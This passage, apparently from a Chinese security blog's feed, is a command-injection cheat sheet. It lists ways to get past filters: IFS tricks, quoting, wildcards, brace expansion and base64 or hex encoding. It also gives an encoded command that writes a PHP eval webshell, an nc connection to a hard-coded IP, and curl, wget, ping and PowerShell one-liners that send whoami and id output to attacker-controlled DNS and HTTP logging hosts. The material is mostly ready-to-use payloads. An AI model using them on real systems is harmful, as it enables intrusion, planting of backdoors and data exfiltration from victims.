class="variable">$9flag</span></span></span><br><span class="line"><span class="meta">cat$</span><span class="bash">IFS<span class="variable">$9flag</span></span></span><br><span class="line"><span class="meta">cat%</span><span class="bash">09flag  <span class="comment"># \0x09 是 TAB</span></span></span><br></pre></td></tr></table></figure><ul><li>重定向符&lt;&gt;</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat&lt;&gt;flag</span><br><span class="line">cat&lt;flag</span><br></pre></td></tr></table></figure><h3 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h3><ul><li>拼接</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=c;b=at;c=flag;$a$b $c</span><br></pre></td></tr></table></figure><ul><li>利用已存在的资源</li></ul><p>从已有的文件或者环境变量中获得相应的字符。</p><ul><li>编码</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">`echo "Y2F0IGZsYWc="|base64 -d`</span><br><span class="line">echo "Y2F0IGZsYWc="|base64 -d|bash</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash">(<span class="built_in">printf</span> <span class="string">"\x63\x61\x74\x20\x66\x6c\x61\x67"</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">可以通过这样来写webshell,内容为&lt;?php @<span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">'c'</span>]);?&gt;</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> &#123;<span class="built_in">printf</span>,<span class="string">"\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76"</span>&#125; &gt;&gt; 1.php</span></span><br></pre></td></tr></table></figure><ul><li>单引号、双引号</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c""at fl''ag</span><br><span class="line">c'a't f'l'ag</span><br></pre></td></tr></table></figure><ul><li>反斜线 \</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c\at fl\ag</span><br></pre></td></tr></table></figure><ul><li>通配符</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">/?in/?s =&gt; ls</span><br><span class="line"></span><br><span class="line">* 0到无穷个任意字符</span><br><span class="line">? 一个任意字符</span><br><span class="line">[ ] 一个在括号内的字符，e.g. [abcd]</span><br><span class="line">[ - ] 在编码顺序内的所有字符</span><br><span class="line">[^ ] 一个不在括号内的字符</span><br><span class="line">[! ] 同 ^</span><br><span class="line">cat fl[0-z]g</span><br><span class="line"></span><br><span class="line">echo d&#123;a,e,i,u,o&#125;g =&gt; dag deg dig dug dog</span><br><span class="line">echo &#123;fl,fla&#125;&#123;ag,g&#125; =&gt; flag flg flaag flag</span><br><span class="line">echo fl&#123;0..z&#125;g =&gt; fl1g,fl2g,...,flyg,flzg</span><br><span class="line"></span><br><span class="line">花括号拓展&#123;OS_COMMAND,ARGUMENT&#125;</span><br><span class="line">在Linux bash中还可以使用&#123;cat,/etc/passwd&#125;来绕过</span><br><span class="line">这里没实验成功</span><br></pre></td></tr></table></figure><ul><li>未定义变量</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">cat$</span><span class="bash">x /etc/passwd</span></span><br></pre></td></tr></table></figure><ul><li>可变函数</li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(sy.(st).em)(whoami)</span><br><span class="line"><span class="variable">$_GET</span>[a](<span class="variable">$_GET</span>[b].<span class="variable">$_GET</span>[c])</span><br><span class="line"></span><br><span class="line">获取内置函数<span class="built_in"> system </span>的索引后，直接执行</span><br><span class="line">get_defined_functions()[internal] | grep ststem</span><br><span class="line">get_defined_functions()[internal][381](whoami)</span><br></pre></td></tr></table></figure><ul><li><code>$@</code></li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$ c<span class="variable">$@at</span> fl<span class="variable">$@ag</span></span><br><span class="line">flag&#123;xxx&#125;</span><br><span class="line"></span><br><span class="line">$ echo i<span class="variable">$@d</span></span><br><span class="line">id</span><br><span class="line"></span><br><span class="line">$ i<span class="variable">$@d</span></span><br><span class="line"><span class="attribute">uid</span>=1000(wywwzjj) <span class="attribute">gid</span>=1000(wywwzjj) <span class="attribute">groups</span>=1000(wywwzjj)</span><br><span class="line"></span><br><span class="line">$ echo i<span class="variable">$@d</span>|<span class="variable">$0</span></span><br><span class="line"><span class="attribute">uid</span>=1000(wywwzjj) <span class="attribute">gid</span>=1000(wywwzjj) <span class="attribute">groups</span>=1000(wywwzjj)</span><br><span class="line"></span><br><span class="line">$ echo &#123;nc,47.101.220.241,2333&#125;|<span class="variable">$0</span></span><br><span class="line">直接连 nc 了。。。<span class="variable">$0</span> 好牛逼？</span><br><span class="line"><span class="variable">$0</span> 就相当于 bash 另外 <span class="variable">$n</span> 表示命令行第 n 个参数</span><br><span class="line"></span><br><span class="line">$ <span class="variable">$0</span>&lt;&lt;&lt;i<span class="variable">$@d</span></span><br><span class="line"><span class="attribute">uid</span>=1000(wywwzjj) <span class="attribute">gid</span>=1000(wywwzjj) <span class="attribute">groups</span>=1000(wywwzjj)</span><br></pre></td></tr></table></figure><ul><li>利用已经存在的资源</li></ul><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="keyword">echo</span> $PATH</span><br><span class="line"><span class="string">/usr/local/sbin</span>:<span class="string">/usr/local/bin</span>:<span class="string">/usr/sbin</span>:<span class="string">/usr/bin</span>:<span class="string">/sbin</span>:<span class="string">/bin</span></span><br><span class="line"></span><br><span class="line">$ <span class="keyword">echo</span> $PATH| cut -c 1</span><br><span class="line">/</span><br><span class="line"></span><br><span class="line">$ <span class="keyword">echo</span> $PATH| cut -c 1-4</span><br><span class="line"><span class="string">/usr</span></span><br></pre></td></tr></table></figure><ul><li>${PS2} 对应字符 ‘&gt;’</li><li>${PS4} 对应字符 ‘+’</li><li>${IFS} 对应 内部字段分隔符</li><li>${9} 对应 空字符串</li></ul><h3 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h3><ul><li><p>弹 shell</p></li><li><p>DNS 外带数据</p></li></ul><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">"http://testhash.test.dnslog.link/?`whoami`"</span></span><br></pre></td></tr></table></figure><ul><li>HTTP 外带</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> linux</span></span><br><span class="line">curl http://evil-server/`whoami`</span><br><span class="line">wget http://evil-server/$(whoami)</span><br><span class="line">curl xxxx.ceye.io/`whoami`</span><br><span class="line">curl http://xxxx.ceye.io/$(id|base64)</span><br><span class="line">ping -c 1 `whoami`.xxxx.ceye.io</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> windows</span></span><br><span class="line">http:</span><br><span class="line">for /F %x in ('whoami') do start http://xxx.ceye.io/%x</span><br><span class="line">dns请求：</span><br><span class="line">获取计算机名：for /F "delims=" %i in ('whoami') do ping -n 1 %i.xxx.dnslog.info</span><br><span class="line">获取用户名：for /F "delims= tokens=2" %i in ('whoami') do ping -n 1 %i.xxx.dnslog.info</span><br><span class="line"></span><br><span class="line">for /F %x in ('whoami') do powershell $a=[System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes('%x'));$b=New-Object System.Net.WebClient;$b.DownloadString('http://xxx.ceye.io/'+$a);</span><br></pre></td></tr></table></figure><h3 id="长度限制"><a href="#长度限制" class="headerlink" title="长度限制"></a>长度限制</h3><ul><li>文件构造（参考橘子那个 hitcon）</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash">w</span></span><br><span class="line">将会创建一个名字为 w 的空文件。</span><br></pre></td></tr></table></figure><p>工具</p><ul><li><a href="https://github.com/ewilded/shelling" target="_blank" rel="noopener">shelling</a></li></ul><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://mp.weixin.qq.com/s/Hm6TiLHiAygrJr-MGRq9Mw" target="_blank" rel="noopener">巧用命令注入的 N 种姿势</a></p><p><a href="https://chybeta.github.io/2017/08/15/命令执行的一些绕过技巧/" target="_blank" rel="noopener">https://chybeta.github.io/2017/08/15/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;直接执行代码&quot;&gt;&lt;a href=&quot;#直接执行代码&quot; class=&quot;headerlink&quot; title=&quot;直接执行代码&quot;&gt;&lt;/a&gt;直接执行代码&lt;/h2&gt;&lt;p&gt;PHP 中有不少可以直接执行代码的函数。&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;
      
    
    </summary>
    
    
      <category term="命令注入" scheme="https://wywwzjj.top/tags/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
</feed>
